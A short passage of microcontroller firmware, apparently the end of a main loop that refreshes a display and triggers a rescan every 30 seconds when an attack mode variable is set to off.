    lastDisplayUpdate = millis();
    updateDisplay();
  }
  
  // Auto-rescan every 30 seconds if not attacking
  if (currentAttack == ATTACK_OFF && millis() - lastScanTime > 30000) {
    performScan();
  }
}
